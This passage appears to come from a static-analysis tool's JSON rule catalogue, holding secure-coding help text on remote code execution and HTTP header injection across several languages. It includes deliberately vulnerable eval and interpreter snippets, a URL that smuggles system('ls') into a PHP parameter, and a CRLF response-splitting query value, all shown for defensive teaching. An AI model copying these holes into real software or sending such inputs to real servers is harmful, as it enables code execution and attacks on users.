expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Python, consider using the \nast (*Abstract Syntax Tree*) module, which allows you to parse expressions and evaluate each node atomically. This will\nhelp you \"sandbox\" the functions a user can invoke, removing the risks of arbitrary code execution.\n\nHere's a simple example of a DSL that can evaluate mathematical expressions:\n\npython\nimport ast, operator, math\n\ndef safe_eval(expression):\n  \"\"\"Evaluate a simple mathematical function by parsing an expression into an\n  abstract syntax tree and safely evaluating each node in turn.\"\"\"\n\n  def find_math_function(x, *args):\n    if x not in [x for x in dir(math) if not \"__\" in x]:\n      raise SyntaxError(f\"Unknown function {x}()\")\n\n    return getattr(math, x)\n\n  binary_operations = {\n    ast.Add:   operator.add,\n    ast.Sub:   operator.sub,\n    ast.Mult:  operator.mul,\n    ast.Div:   operator.truediv,\n    ast.Mod:   operator.mod,\n    ast.Pow:   operator.pow,\n    ast.Call:  find_math_function,\n    ast.BinOp: ast.BinOp,\n  }\n\n  unary_operations = {\n    ast.USub:    operator.neg,\n    ast.UAdd:    operator.pos,\n    ast.UnaryOp: ast.UnaryOp,\n  }\n\n  operations = tuple(binary_operations) + tuple(unary_operations)\n\n  syntax_tree = ast.parse(expression, mode='eval')\n\n  def _eval(node):\n    if isinstance(node, ast.Expression):\n      return _eval(node.body)\n    elif isinstance(node, ast.Str):\n      return node.s\n    elif isinstance(node, ast.Num):\n      return node.value\n    elif isinstance(node, ast.Constant):\n      return node.value\n    elif isinstance(node, ast.BinOp):\n      if isinstance(node.left, operations):\n        left = _eval(node.left)\n      else:\n        left = node.left.value\n      if isinstance(node.right, operations):\n        right = _eval(node.right)\n      else:\n        right = node.right.value\n      return binary_operations[type(node.op)](left, right)\n    elif isinstance(node, ast.UnaryOp):\n      if isinstance(node.operand, operations):\n        operand = _eval(node.operand)\n      else:\n        operand = node.operand.value\n      return unary_operations[type(node.op)](operand)\n    elif isinstance(node, ast.Call):\n      args = [_eval(x) for x in node.args]\n      function = find_math_function(node.func.id)\n      return function(*args)\n    else:\n      raise SyntaxError(f\"Bad syntax, {type(node)}\")\n\n  return _eval(syntax_tree)\n\nsafe_eval(\"1 + 1\")       # Will return 2\nsafe_eval(\"(100*10)+6\")  # Will return 1006\nsafe_eval(\"sqrt(16)+1\")  # Will return 5.0\n\n\n:::\n\n:::tab[Scala]\n\n## Remote Code Execution in Scala\n\nScala code can be evaluated dynamically using the scala-lang package, that will generate bytecode objects to be loaded \ninto the underlying Java Virtual Machine. The following web-application takes a scriptlet from an HTTP parameter and\nevaluates the result:\n\nscala\ncase class Scriptlet(code: String)\n\ndef scriptExecutionForm = Form(\n  mapping(\n    \"code\" -> text\n  )(Scriptlet.apply)(Scriptlet.unapply)\n)\n\ndef evaluateScript = Action(parse.form(scriptExecutionForm)) { request =>\n  val settings = new Settings\n\n  settings.usejavacp.value   = true\n  settings.deprecation.value = true\n\n  val eval      = new IMain(settings)\n  val evaluated = eval.interpret(request.body.code)\n\n  if (evaluated == Success) {\n    val result = eval.valueOfTerm(\"result\").get.asInstanceOf[String]\n    Ok(result)\n  }\n  else {\n    Status(488)(\"Unable to evaluate this code\")\n  }\n}\n\n\nAnother common method of achieving dynamic execution in Scala is by using reflection:\n\nscala\nimport scala.reflect.runtime.universe\nimport scala.tools.reflect.ToolBox\n\nval toolbox = universe.runtimeMirror(getClass.getClassLoader).mkToolBox()\ntoolbox.eval(toolbox.parse(\"\"\"println(\"Hello world\")\"\"\"))\n\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Java Virtual \nMachine - meaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid using dynamic evaluation of Scala altogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Scala, consider using a\ntoolkit like the Scala Standard Parser Combinator Library, which allows you to write parsers that will \"sandbox\" the \nfunctions a user can invoke, removing the risks of arbitrary code execution.\n\nThe math-expression-parser library is good example of a well-scoped DSL that allows evaluation of simple arithmetic\nexpressions:\n\nscala\nimport io.github.facaiy.math.expression.MathExp\n\nval expressionString = \"1.0 + sqrt(2 * $a1) + $a2 ** 2\"\nval parsedExpression = MathExp.parse(expressionString)\nval inputVariables   = Map(\"a1\" -> 2, \"a2\" -> 1)\n\n// This will return the value \"4.0\", by evaluating the expression with the supplied input variables.\nval output = parsedExpression.eval(inputVariables)\n\n\n:::\n\n:::tab[Go]\n\n## Remote Code Execution in Go\n\nDynamic execution of Go is relatively rare. The Go playground (https://go.dev/play/) allows you to run Go code from a\nweb browser, and achieves this by dynamically compiling code using the Go toolchain, and executing the compiled code in\na sandbox on a remote server.\n\nMore common is the use of packages like net/rpc or grpc to allow remote invocation of individual methods across a \nnetwork. This allows a development team to build efficient, distributed micro-services.\n\nTo mitigate remote code execution attacks in a distributed computing environment, you must ensure any procedure calls \ncome from a trusted source. With grpc this can be achieved using Application Layer Transport Security (ALTS), a mutual \nauthentication and transport developed by Google:\n\ngo\nimport (\n  \"google.golang.org/grpc\"\n  \"google.golang.org/grpc/credentials/alts\"\n)\n\naltsTC          := alts.NewClientCreds(alts.DefaultClientOptions())\nconnection, err := grpc.Dial(serverAddr, grpc.WithTransportCredentials(altsTC))\n\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Go, consider using an \nembeddable scripting language like Lua:\n\ngo\nimport (\n  \"github.com/yuin/gopher-lua\"\n)\n\nfunc main() {\n  // Instantiate a Lua sandbox.\n  sandbox := lua.NewState()\n  \n  defer sandbox.Close()\n  \n  // Dynamically execute a string as Lua code.\n  if err := sandbox.DoString(print(\"hello\")); err != nil {\n    panic(err)\n  }\n}\n\n\nThis example will execute the simple Lua expression print(\"hello\"). Using a Lua sandbox in this fashion will allow you \nto execute dynamic expressions passed by a user safely - simply pass the expression to the sandbox.DoString(...) \nfunction to execute it. The executed code will *only* be able to access state you pass to the sandbox via the \nsandbox.SetField(...) function, closing any security loopholes associated with remote code execution.\n\n:::\n\n:::tab[PHP]\n\n## Remote Code Execution in PHP\n\nPHP provides several functions that allow for the execution of system commands and the evaluation of code dynamically. Some commonly used functions for this purpose include eval(), system(), exec(), passthru(), shell_exec(), and others.\n\nThis vulnerability arises when developers use these functions without properly validating or sanitizing user inputs. This can allow an attacker to inject and execute arbitrary code on the server.\n\nConsider the following PHP snippet, which takes a script input from an HTTP request and evaluates it:\n\nphp\n<?php\n$script = $_GET['script'];\n\n// Using the eval function directly on unsanitized input poses a severe security risk.\n// An attacker can provide a malicious PHP code as a value for the \"script\" parameter and execute it.\neval($script);\n\necho \"Script executed successfully!\";\n?>\n\n\nBy visiting a URL like http://example.com/vulnerable.php?script=system('ls'); an attacker could execute the ls command, and with more malicious intent, they can cause significant harm.\n\n## Mitigation\n\nTo secure your code, ensure that strings passed to evaluation or execution functions are from trusted sources, or are validated against an allow-list:\n\nphp\n<?php\n$allowedScripts = ['print_hello' => 'echo \"Hello, World!\";'];\n\n$scriptKey = $_GET['scriptKey'];\n\n// Validate against an allow-list of scripts.\nif (!array_key_exists($scriptKey, $allowedScripts)) {\n    die(\"Not permitted\");\n}\n\neval($allowedScripts[$scriptKey]);\n\necho \"Script executed successfully!\";\n?>\n\n\n## Further Considerations\n\nDynamic code evaluation in PHP should be used with extreme caution. Whenever possible, avoid using functions like eval() altogether. If dynamic functionality is needed, consider more secure alternatives like creating pre-defined safe functions or adopting a Domain-Specific Language (DSL) with strict parsing and validation. Always use PHP's built-in functions to sanitize and validate all user inputs to prevent code injections.\n\n:::\n\n::::\n\n## CWEs\n\n**[CWE-77](https://cwe.mitre.org/data/definitions/77.html)**\n\n**[CWE-78](https://cwe.mitre.org/data/definitions/78.html)**\n\n**[CWE-94](https://cwe.mitre.org/data/definitions/94.html)**\n\n**[CWE-917](https://cwe.mitre.org/data/definitions/917.html)**\n\n**[OWASP-A1](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)**.",
                "markdown": "Attacker-controlled data is used in a code execution context without undergoing escaping or validation. This indicates a remote code execution vulnerability.\n\n# Remote Code Execution\n\nA **remote code execution** (RCE) vulnerability allows an attacker to execute arbitrary code on you server. On a\nweb-server, RCE vulnerabilities are typically cause when untrusted input from the HTTP request is evaluated as code.\n\n::::tabs\n\n:::tab[Java]\n\n## Remote Code Execution in Java\n\nDynamic evaluation of code in Java can be achieved in a number of ways. The Java scripting API (defined in the\n`javax.script` page) package allows you to evaluate code in a number of different scripting languages via the \n`ScriptEngineManager` class. There are, for instance, JVM compatible versions of Python (called Jython) and Ruby (called\nJRuby) that can be loaded as jars and invoked via the script manager.\n\nThe Java compiler can also be invoked programmatically via the `javax.tools.JavaCompiler` interface. This approach is\noften used by build tools, which convert files on disk to runnable code that can be loaded into the JVM.\n\nFinally, there are a number of other tools that allow dynamic evaluation of code. The Apache Bean Scripting Framework\na range of scripting languages, and the scripting languages like Groovy can be added to the Java runtime by simply\nadding a jar in the classpath.\n\nWith all of these approaches, it is of vital importance that you only pass trusted code to the scripting API. Passing \nuntrusted content to the `ScriptingEngine` class, for instance,  will allow an attacker to execute arbitrary code in \nyour Java Virtual Machine - meaning they can steal sensitive information, read files from disk, or install malware.\n\nTo secure your code, you should ensure any strings passed to a scripting engine are taken from a trusted source, or \nvalidated against an allow-list:\n\n```java\nprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException \n{\n  String code = request.getParameter(\"script\");\n\n  // Since we are taking the code to execute from an untrusted source (the HTTP\n  // request) we *must* validate against an allowed list of scripts.      \n  if (!allowedCommands.contains(code))\n    throw new IOException(\"Not permitted\");\n\n  ScriptEngineManager manager = new ScriptEngineManager();\n  ScriptEngine        engine  = manager.getEngineByName(\"JavaScript\");\n  engine.eval(input);\n  \n  response.setStatus(200);\n}\n```\n\n## Further Considerations\n\nDynamic code evaluation is often used where there is a need to develop a *Domain Specific Language* (DSL) for expert \nusers. In such a scenario, it is preferable to execute DSL statements in a sandbox with limited permissions. (For\ninstance, you probably want to limit disk and network access if you are simply evaluating mathematical statements.) One\nway to achieve this is by formally defining the grammar of the DSL, and using a tool like Java Compiler Compiler (JavaCC)\nor ANTLR to generate a parser that can evaluate scripts at runtime. Since the grammar specification defines which\nfunctions are executable, you have full control over what the DSL can do.\n\n:::\n\n:::tab[C#]\n\n## Remote Code Execution in C#\n\nC# code can be evaluated dynamically using the Code Document Object Model (CodeDOM) module, defined in the \n`System.CodeDom` namespace. CodeDOM allows for templated code generation and dynamic compilation within the .NET \nruntime.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your C# runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to using the CodeDOM module in applications that face\nthe internet.\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in .NET, consider using one of\nthe following solutions:\n\n* Microsoft's DSL Tools, that come bundled with Visual Studio and allow the visual creation of DSLs.\n* A scripting language like Lua that can be dynamically loaded and executed within the .NET runtime.\n* ANTLR, a parser generator that can be used to generate and execute sand-boxed languages.\n\n:::\n\n:::tab[JavaScript]\n\n## Remote Code Execution in JavaScript Using Eval\n\nJavaScript makes dynamic evaluation of strings as code very easy by making the `eval(...)` function available. For\ninstance, the following JavaScript code will print \"WARNING\" to the console:\n\n```javascript\n  eval(\"console.log('WARNING')\")\n```\n\nIf an attacker is able to control the input to an `eval(...)` call by passing it in an HTTP request, they can run code\non your server. This will allow them to scan your file system, install a remote shell, and take over your server \ncompletely.\n\n## Other Types of Remote Code Execution in JavaScript\n\nInput strings can also be dynamically evaluated as code in the JavaScript runtime using the `Function(...)` or\n`Script(...)` constructors. There are various subtle ways of doing this, as illustrated by the following code:\n\n```javascript\nconst arbitraryObject = {},\n      a = 'constructor',\n      b = 'constructor',\n      s = 'console.log(\"Hacked!\")';\n\n// This will print the phrase 'Hacked!' to the console.\narbitraryObject[a][b](s)()\n```\n\nThese two lines of code illustrate an RCE vulnerability. Properties can be looked up on a JavaScript object by name, \nand this includes functions. The illustrated exploit gets the constructor function for an arbitrary object, looks up \nrhe constructor function for the constructor (which is actually `Function(...)`), passes it a command string, then \nexecutes that string. \n\nAlthough this example is contrived, it illustrates how any code that has the form:\n\n```javascript\narbitraryObject[parameterA][parameterB](parameterC)()\n```\n\n...enables a remote execution attack if all the parameters can be controlled by an attacker.\n\n## Mitigation\n\n* Don't use the `eval(...)` function in your code. Check your codebase with a linter as part of your build process.\n* Consider disabling use of `eval(...)` in the Node.js runtime by passing the `--disallow-code-generation-from-strings`\n  at startup. (You will have to ensure none of your dependencies use the `eval(...)` function to do this.)\n* Validate all untrusted input with allow-lists: check any input take from the HTTP request is safe before processing \n  it.\n* If you make nested lookups on objects, make assertions about object types when pulling them from another object. If\n  your code finds a function where it expects a string, don't invoke it!\n\n:::\n\n:::tab[Python]\n\n## Remote Code Execution in Python\n\nPython code can be evaluated dynamically using the global `eval(...)` and `exec(...)` functions. The former expects\na string representing a (single) valid Python expression, while the later can execute multiple expressions - making it \nable to create new module, class, and function definitions. Both functions have access to the global and local state\nat the point of invocation.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Python runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid `eval(...)` and `exec(...)` functions of Python \naltogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Python, consider using the \n`ast` (*Abstract Syntax Tree*) module, which allows you to parse expressions and evaluate each node atomically. This will\nhelp you \"sandbox\" the functions a user can invoke, removing the risks of arbitrary code execution.\n\nHere's a simple example of a DSL that can evaluate mathematical expressions:\n\n```python\nimport ast, operator, math\n\ndef safe_eval(expression):\n  \"\"\"Evaluate a simple mathematical function by parsing an expression into an\n  abstract syntax tree and safely evaluating each node in turn.\"\"\"\n\n  def find_math_function(x, *args):\n    if x not in [x for x in dir(math) if not \"__\" in x]:\n      raise SyntaxError(f\"Unknown function {x}()\")\n\n    return getattr(math, x)\n\n  binary_operations = {\n    ast.Add:   operator.add,\n    ast.Sub:   operator.sub,\n    ast.Mult:  operator.mul,\n    ast.Div:   operator.truediv,\n    ast.Mod:   operator.mod,\n    ast.Pow:   operator.pow,\n    ast.Call:  find_math_function,\n    ast.BinOp: ast.BinOp,\n  }\n\n  unary_operations = {\n    ast.USub:    operator.neg,\n    ast.UAdd:    operator.pos,\n    ast.UnaryOp: ast.UnaryOp,\n  }\n\n  operations = tuple(binary_operations) + tuple(unary_operations)\n\n  syntax_tree = ast.parse(expression, mode='eval')\n\n  def _eval(node):\n    if isinstance(node, ast.Expression):\n      return _eval(node.body)\n    elif isinstance(node, ast.Str):\n      return node.s\n    elif isinstance(node, ast.Num):\n      return node.value\n    elif isinstance(node, ast.Constant):\n      return node.value\n    elif isinstance(node, ast.BinOp):\n      if isinstance(node.left, operations):\n        left = _eval(node.left)\n      else:\n        left = node.left.value\n      if isinstance(node.right, operations):\n        right = _eval(node.right)\n      else:\n        right = node.right.value\n      return binary_operations[type(node.op)](left, right)\n    elif isinstance(node, ast.UnaryOp):\n      if isinstance(node.operand, operations):\n        operand = _eval(node.operand)\n      else:\n        operand = node.operand.value\n      return unary_operations[type(node.op)](operand)\n    elif isinstance(node, ast.Call):\n      args = [_eval(x) for x in node.args]\n      function = find_math_function(node.func.id)\n      return function(*args)\n    else:\n      raise SyntaxError(f\"Bad syntax, {type(node)}\")\n\n  return _eval(syntax_tree)\n\nsafe_eval(\"1 + 1\")       # Will return 2\nsafe_eval(\"(100*10)+6\")  # Will return 1006\nsafe_eval(\"sqrt(16)+1\")  # Will return 5.0\n```\n\n:::\n\n:::tab[Scala]\n\n## Remote Code Execution in Scala\n\nScala code can be evaluated dynamically using the `scala-lang` package, that will generate bytecode objects to be loaded \ninto the underlying Java Virtual Machine. The following web-application takes a scriptlet from an HTTP parameter and\nevaluates the result:\n\n```scala\ncase class Scriptlet(code: String)\n\ndef scriptExecutionForm = Form(\n  mapping(\n    \"code\" -> text\n  )(Scriptlet.apply)(Scriptlet.unapply)\n)\n\ndef evaluateScript = Action(parse.form(scriptExecutionForm)) { request =>\n  val settings = new Settings\n\n  settings.usejavacp.value   = true\n  settings.deprecation.value = true\n\n  val eval      = new IMain(settings)\n  val evaluated = eval.interpret(request.body.code)\n\n  if (evaluated == Success) {\n    val result = eval.valueOfTerm(\"result\").get.asInstanceOf[String]\n    Ok(result)\n  }\n  else {\n    Status(488)(\"Unable to evaluate this code\")\n  }\n}\n```\n\nAnother common method of achieving dynamic execution in Scala is by using reflection:\n\n```scala\nimport scala.reflect.runtime.universe\nimport scala.tools.reflect.ToolBox\n\nval toolbox = universe.runtimeMirror(getClass.getClassLoader).mkToolBox()\ntoolbox.eval(toolbox.parse(\"\"\"println(\"Hello world\")\"\"\"))\n```\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Java Virtual \nMachine - meaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid using dynamic evaluation of Scala altogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Scala, consider using a\ntoolkit like the Scala Standard Parser Combinator Library, which allows you to write parsers that will \"sandbox\" the \nfunctions a user can invoke, removing the risks of arbitrary code execution.\n\nThe `math-expression-parser` library is good example of a well-scoped DSL that allows evaluation of simple arithmetic\nexpressions:\n\n```scala\nimport io.github.facaiy.math.expression.MathExp\n\nval expressionString = \"1.0 + sqrt(2 * $a1) + $a2 ** 2\"\nval parsedExpression = MathExp.parse(expressionString)\nval inputVariables   = Map(\"a1\" -> 2, \"a2\" -> 1)\n\n// This will return the value \"4.0\", by evaluating the expression with the supplied input variables.\nval output = parsedExpression.eval(inputVariables)\n```\n\n:::\n\n:::tab[Go]\n\n## Remote Code Execution in Go\n\nDynamic execution of Go is relatively rare. The Go playground (https://go.dev/play/) allows you to run Go code from a\nweb browser, and achieves this by dynamically compiling code using the Go toolchain, and executing the compiled code in\na sandbox on a remote server.\n\nMore common is the use of packages like `net/rpc` or `grpc` to allow remote invocation of individual methods across a \nnetwork. This allows a development team to build efficient, distributed micro-services.\n\nTo mitigate remote code execution attacks in a distributed computing environment, you must ensure any procedure calls \ncome from a trusted source. With `grpc` this can be achieved using Application Layer Transport Security (ALTS), a mutual \nauthentication and transport developed by Google:\n\n```go\nimport (\n  \"google.golang.org/grpc\"\n  \"google.golang.org/grpc/credentials/alts\"\n)\n\naltsTC          := alts.NewClientCreds(alts.DefaultClientOptions())\nconnection, err := grpc.Dial(serverAddr, grpc.WithTransportCredentials(altsTC))\n```\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Go, consider using an \nembeddable scripting language like Lua:\n\n```go\nimport (\n  \"github.com/yuin/gopher-lua\"\n)\n\nfunc main() {\n  // Instantiate a Lua sandbox.\n  sandbox := lua.NewState()\n  \n  defer sandbox.Close()\n  \n  // Dynamically execute a string as Lua code.\n  if err := sandbox.DoString(`print(\"hello\")`); err != nil {\n    panic(err)\n  }\n}\n```\n\nThis example will execute the simple Lua expression `print(\"hello\")`. Using a Lua sandbox in this fashion will allow you \nto execute dynamic expressions passed by a user safely - simply pass the expression to the `sandbox.DoString(...)` \nfunction to execute it. The executed code will *only* be able to access state you pass to the sandbox via the \n`sandbox.SetField(...)` function, closing any security loopholes associated with remote code execution.\n\n:::\n\n:::tab[PHP]\n\n## Remote Code Execution in PHP\n\nPHP provides several functions that allow for the execution of system commands and the evaluation of code dynamically. Some commonly used functions for this purpose include `eval()`, `system()`, `exec()`, `passthru()`, `shell_exec()`, and others.\n\nThis vulnerability arises when developers use these functions without properly validating or sanitizing user inputs. This can allow an attacker to inject and execute arbitrary code on the server.\n\nConsider the following PHP snippet, which takes a script input from an HTTP request and evaluates it:\n\n```php\n<?php\n$script = $_GET['script'];\n\n// Using the eval function directly on unsanitized input poses a severe security risk.\n// An attacker can provide a malicious PHP code as a value for the \"script\" parameter and execute it.\neval($script);\n\necho \"Script executed successfully!\";\n?>\n```\n\nBy visiting a URL like `http://example.com/vulnerable.php?script=system('ls');` an attacker could execute the `ls` command, and with more malicious intent, they can cause significant harm.\n\n## Mitigation\n\nTo secure your code, ensure that strings passed to evaluation or execution functions are from trusted sources, or are validated against an allow-list:\n\n```php\n<?php\n$allowedScripts = ['print_hello' => 'echo \"Hello, World!\";'];\n\n$scriptKey = $_GET['scriptKey'];\n\n// Validate against an allow-list of scripts.\nif (!array_key_exists($scriptKey, $allowedScripts)) {\n    die(\"Not permitted\");\n}\n\neval($allowedScripts[$scriptKey]);\n\necho \"Script executed successfully!\";\n?>\n```\n\n## Further Considerations\n\nDynamic code evaluation in PHP should be used with extreme caution. Whenever possible, avoid using functions like `eval()` altogether. If dynamic functionality is needed, consider more secure alternatives like creating pre-defined safe functions or adopting a Domain-Specific Language (DSL) with strict parsing and validation. Always use PHP's built-in functions to sanitize and validate all user inputs to prevent code injections.\n\n:::\n\n::::\n\n## CWEs\n\n**[CWE-77](https://cwe.mitre.org/data/definitions/77.html)**\n\n**[CWE-78](https://cwe.mitre.org/data/definitions/78.html)**\n\n**[CWE-94](https://cwe.mitre.org/data/definitions/94.html)**\n\n**[CWE-917](https://cwe.mitre.org/data/definitions/917.html)**\n\n**[OWASP-A1](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)**."
              },
              "name": "RemoteCodeExecution",
              "properties": {
                "tags": [
                  "ng-sast"
                ],
                "precision": "very-high"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "fullDescription": {
                "text": "Attacker-controlled data is used in a code execution context without undergoing escaping or validation. This indicates a remote code execution vulnerability."
              },
              "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
              "shortDescription": {
                "text": "Remote Code Execution"
              }
            },
            {
              "id": "attacker-to-httpHeader",
              "help": {
                "text": "Attacker-controlled data is stored in HTTP headers without escaping. This indicates a CRLF or header injection vulnerability.\n\n# Header Injection\n\n**Header injection** vulnerabilities occur when HTTP response headers are\nconstructed from untrusted input. Besides direct control over the HTTP header in\nquestion, in most cases this can be abused in the form of a **CRLF Injection**\nfor **HTTP Response Splitting** to send additional, malicious HTTP responses to\na victim's browser.\n\n::::tabs\n\n:::tab[Java]\n\n## Header Injection in Java\n\nConsider the following code that takes the language parameter from the query string of the HTTP request and writes it \nout it to the Content-Language header:\n\njava\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException\n{\n    String language = request.getParameter(\"language\");\n    \n    if (language == null) {\n        language = \"en-us\";\n    }\n\n    response.setHeader(\"Content-Language\", language);\n\n    RequestDispatcher dispatcher = request.getRequestDispatcher(\"welcome\");\n    dispatcher.forward(request, response);\n}\n\n\nThis code is intended to take a request with a language in the query string:\n\n\n  ?language=en-us\n\n\nAnd write the corresponding header in the HTTP response:\n\n\n  Content-Language: en-us\n\n\nHowever, the code does not strip out new-line characters, which means a URL with the following form:\n\n\n  ?language=en-us\\nHTTP/1.1+200+OK\n\n\n...can be used to by an attacker to generate two separate HTTP responses, the second of which is under full control\nof an attacker. This is called **HTTP response splitting**, and can be used to launch various types of attack:\n\n* *Cross-site scripting* (XSS) attacks, where malicious JavaScript code is sent to the victim's browser and executed \n  under your web-domain.\n  \n* *Cache-poisoning* attacks, where any downstream caching servers will have malicious content injected into them. This\n  will affect subsequent victims that visit the same poisoned resource within the caching period.\n  \n* *Malware delivery*, whereby the second HTTP response contains a malicious payload, like a PDF file that takes \n  advantage of vulnerabilities in common PDF viewing software.\n\n:::\n\n:::tab[C#]\n\n## Header Injection in C#\n\nConsider the following code that takes the language parameter from the query string of the HTTP request and writes it \nout it to the Content-Language header:\n\ncsharp\npublic IActionResult Language([FromQuery] string language) \n{\n    if (string.IsNullOrEmpty(language)) \n    {\n        language = \"en-us\";\n    }\n\n    Response.Headers.Add(\"Content-Language\", language);\n    return View();\n}\n\n\nThis code is intended to take a request with a language in the query string:\n\n\n  ?language=en-us\n\n\nAnd write the corresponding header in the HTTP response:\n\n\n  Content-Language: en-us\n\n\nHowever, the code does not strip out new-line characters, which means a URL with the following form:\n\n\n  ?language=en-us\\nHTTP/1.1+200+OK\n\n\n...can be used to by an attacker to generate two separate HTTP responses, the second of which is under full control\nof an attacker. This is called **HTTP response splitting**, and can be used to launch various types of attack:\n\n* *Cross-site scripting* (XSS) attacks, where malicious JavaScript code is sent to the victim's browser and executed \n  under your web-domain.\n  \n* *Cache-poisoning* attacks, where any downstream caching servers will have malicious content injected into them. This\n  will affect subsequent victims that visit the same poisoned resource within the caching period.\n  \n* *Malware delivery*, whereby the second HTTP response contains a malicious payload, like a PDF file that takes \n  advantage of vulnerabilities in common PDF viewing software.\n\n:::\n\n:::tab[JavaScript]\n\n## Header Injection in JavaScript\n\nConsider the following code that takes the language parameter from the query string of the HTTP request and writes it \nout it to the Content-Language header:\n\njavascript\nconst express = require('express')\nconst app     = express()\n\napp.get('/', (request, response) => {\n  const language = request.query.language || 'en-us'\n\n  response.header('Content-Language', language)\n  render_welcome_page(request, response)\n})\n\n\nThis code is intended to take a request with a language in the query string:\n\n\n  ?language=en-us\n\n\nAnd write the corresponding header in the HTTP response:\n\n\n  Content-Language: en-us\n\n\nHowever, the code does not strip out new-line characters, which means a URL with the following form:\n\n\n  ?language=en-us\\nHTTP/1.1+200+OK\n\n\n...can be used to by an attacker to generate two separate HTTP responses, the second of which is under full control\nof an attacker. This is called **HTTP response splitting**, and can be used to launch various types of attack:\n\n* *Cross-site scripting* (XSS) attacks, where malicious JavaScript code is sent to the victim's browser and executed \n  under your web-domain.\n  \n* *Cache-poisoning* attacks, where any downstream caching servers will have malicious content injected into them. This\n  will affect subsequent victims that visit the same poisoned resource within the caching period.\n  \n* *Malware delivery*, whereby the second HTTP response contains a malicious payload, like a PDF file that takes \n  advantage of vulnerabilities in common PDF viewing software.\n\n:::\n\n:::tab[Python]\n\n## Header Injection in Python\n\nConsider the following code that takes the language parameter from the query string of the HTTP request and writes it \nout it to the Content-Language header:\n\npython\n@app.route('/')\ndef home():\n  language = request.args['language'] or 'en-us'\n\n  response = render_welcome_page(language)\n  response.headers = { 'Content-Language' : language }\n  \n  return response\n\n\nThis code is intended to take a request with a language in the query string:\n\n\n  ?language=en-us\n\n\nAnd write the corresponding header in the HTTP response:\n\n\n  Content-Language: en-us\n\n\nHowever, the code does not strip out new-line characters, which means a URL with the following form:\n\n\n  ?language=en-us\\nHTTP/1.1+200+OK\n\n\n...can be used to by an attacker to generate two separate HTTP responses, the second of which is under full control\nof an attacker. This is called **HTTP response splitting**, and can be used to launch various types of attack:\n\n* *Cross-site scripting* (XSS) attacks, where malicious JavaScript code is sent to the victim's browser and executed \n  under your web-domain.\n  \n* *Cache-poisoning* attacks, where any downstream caching servers will have malicious content injected into them. This\n  will affect subsequent victims that visit the same poisoned resource within the caching period.\n  \n* *Malware delivery*, whereby the second HTTP response contains a malicious payload, like a PDF file that takes \n  advantage of vulnerabilities in common PDF viewing software.\n\n:::\n\n:::tab[Scala]\n\n## Header Injection in Scala\n\nConsider the following code that takes the language parameter from the query string of the HTTP request and writes it \nout it to the Content-Language header:\n\nscala\n  def language = Action { request =>\n    val language = request.getQueryString(\"language\").getOrElse(\"en-us\")\n\n    Redirect(\"/\").withHeaders(\"Content-Language\" -> language)\n  }\n\n\nThis code is intended to take a request with a language in the query string:\n\n\n  ?language=en-us\n\n\nAnd write the corresponding header in the HTTP response:\n\n\n  Content-Language: en-us\n\n\nHowever, the code does not strip out new-line characters, which means a URL with the following form:\n\n\n  ?language=en-us\\nHTTP/1.1+200+OK\n\n\n...can be used to by an attacker to generate two separate HTTP responses, the second of which is under full control\nof an attacker. This is called **HTTP response splitting**, and can be used to launch various types of attack:\n\n* *Cross-site scripting* (XSS) attacks, where malicious JavaScript code is sent to the victim's browser and executed \n  under your web-domain.\n  \n* *Cache-poisoning* attacks, where any downstream caching servers will have malicious content injected into them. This\n  will affect subsequent victims that visit the same poisoned resource within the caching period.\n  \n* *Malware delivery*, whereby the second HTTP response contains a malicious payload, like a PDF file that takes \n  advantage of vulnerabilities in common PDF viewing software.\n\n:::\n\n:::tab[Go]\n\n## Header Injection in Go\n\nConsider the following code that takes the language parameter from the query string of the HTTP request and writes it \nout it to the Content-Language header:\n\ngo\nfunc Home(response http.ResponseWriter, request *http.Request) {\n  language := request.URL.Query().Get(\"language\")\n\n  if language == \"\" {\n    language = \"en-us\"\n  }\n\n  response.Header().Add(\"Content-Language\", language)\n\n  if err := templates[\"home\"].Execute(response, nil); err != nil {\n    http.Error(response, err.Error(), http.StatusInternalServerError)\n  }\n}\n\n\nThis code is intended to take a request with a language in the query string:\n\n\n  ?language=en-us\n\n\nAnd write the corresponding header in the 